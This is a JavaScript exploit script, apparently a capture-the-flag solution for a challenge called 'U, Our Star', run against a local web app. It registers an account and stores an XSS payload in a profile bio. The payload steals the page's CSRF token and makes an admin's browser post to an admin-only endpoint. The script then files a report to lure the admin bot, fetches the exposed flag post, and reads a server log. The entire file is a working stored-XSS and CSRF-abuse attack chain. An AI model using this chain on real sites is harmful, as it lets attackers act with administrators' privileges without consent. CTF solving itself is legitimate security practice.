const http = require('http');
const querystring = require('querystring');

const BASE_URL = 'http://localhost:5000';

// Helper function to make HTTP requests
function makeRequest(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const options = {
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            method: method,
            headers: {
                'Cookie': headers.cookie || '',
                ...headers
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: body
                });
            });
        });

        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
}

// Extract cookie from Set-Cookie header
function extractCookie(setCookieHeader) {
    if (Array.isArray(setCookieHeader)) {
        return setCookieHeader
            .map(cookie => cookie.split(';')[0])
            .join('; ');
    }
    return '';
}

// Extract CSRF token from HTML
function extractCSRFToken(html) {
    const match = html.match(/<input[^>]*name="_csrf"[^>]*value="([^"]+)"/);
    return match ? match[1] : null;
}

// Extract session cookie
function getSessionFromSetCookie(header) {
    if (Array.isArray(header)) {
        for (const cookie of header) {
            if (cookie.startsWith('connect.sid=')) {
                return cookie.split(';')[0];
            }
        }
    }
    return '';
}

async function exploit() {
    console.log('[*] Starting U, Our Star exploit...');

    try {
        // 1. Create user account
        console.log('[1] Creating attacker account...');
        let res = await makeRequest('GET', '/auth/register');
        const registerCookie = extractCookie(res.headers['set-cookie']);
        let registerCsrf = extractCSRFToken(res.body);

        res = await makeRequest('POST', '/auth/register', 
            querystring.stringify({
                username: 'attacker',
                password: 'password123',
                _csrf: registerCsrf
            }),
            {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': registerCookie
            }
        );

        const sessionCookie = getSessionFromSetCookie(res.headers['set-cookie']) || registerCookie;
        console.log('[+] Account created');

        // 2. Update profile with XSS payload
        console.log('[2] Updating profile with XSS payload...');
        res = await makeRequest('GET', '/user/profile/attacker', null, { 'Cookie': sessionCookie });
        const csrf = extractCSRFToken(res.body);

        const xssPayload = `<img src=x onerror="
  (async () => {
    const csrf = document.getElementById('csrfToken').value;
    const postId = '015834fa-3317-462d-b234-043d9d0deec9'; // admin's flag post
    await fetch('/admin/blind', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: '_csrf=' + encodeURIComponent(csrf) + '&postId=' + postId
    }).catch(e => {});
  })();
">`;

        res = await makeRequest('POST', '/user/profile/attacker',
            querystring.stringify({
                bio: xssPayload,
                theme: '',
                _csrf: csrf
            }),
            {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionCookie
            }
        );
        console.log('[+] Profile updated with XSS payload');

        // 3. Submit report to trigger admin visit
        console.log('[3] Submitting report to trigger admin visit...');
        res = await makeRequest('GET', '/report', null, { 'Cookie': sessionCookie });
        const reportCsrf = extractCSRFToken(res.body);

        res = await makeRequest('POST', '/report',
            querystring.stringify({
                username: 'attacker',
                _csrf: reportCsrf
            }),
            {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionCookie
            }
        );
        console.log('[+] Report submitted');

        // 4. Wait for admin visit and then fetch the flag
        console.log('[4] Waiting for admin to visit (5 seconds)...');
        await new Promise(resolve => setTimeout(resolve, 5000));

        // 5. Try to fetch the flag post
        console.log('[5] Fetching flag post...');
        res = await makeRequest('GET', '/post/015834fa-3317-462d-b234-043d9d0deec9', null, { 'Cookie': sessionCookie });
        
        if (res.status === 200) {
            const flagMatch = res.body.match(/runa2025\{[^}]+\}/);
            if (flagMatch) {
                console.log('[+] FLAG FOUND: ' + flagMatch[0]);
            } else {
                console.log('[-] Post fetched but flag not found in expected location');
                console.log('Response preview:', res.body.substring(0, 500));
            }
        } else {
            console.log('[-] Failed to fetch flag post (status ' + res.status + ')');
        }

        // Check server log for flag
        console.log('[6] Checking server logs...');
        const fs = require('fs');
        const log = fs.readFileSync('/tmp/server.log', 'utf8');
        const flagMatches = log.match(/runa2025\{[^}]+\}/g);
        if (flagMatches) {
            console.log('[+] FLAG from logs:', flagMatches[flagMatches.length - 1]);
        }

    } catch (error) {
        console.error('[!] Error:', error);
    }
}

exploit();
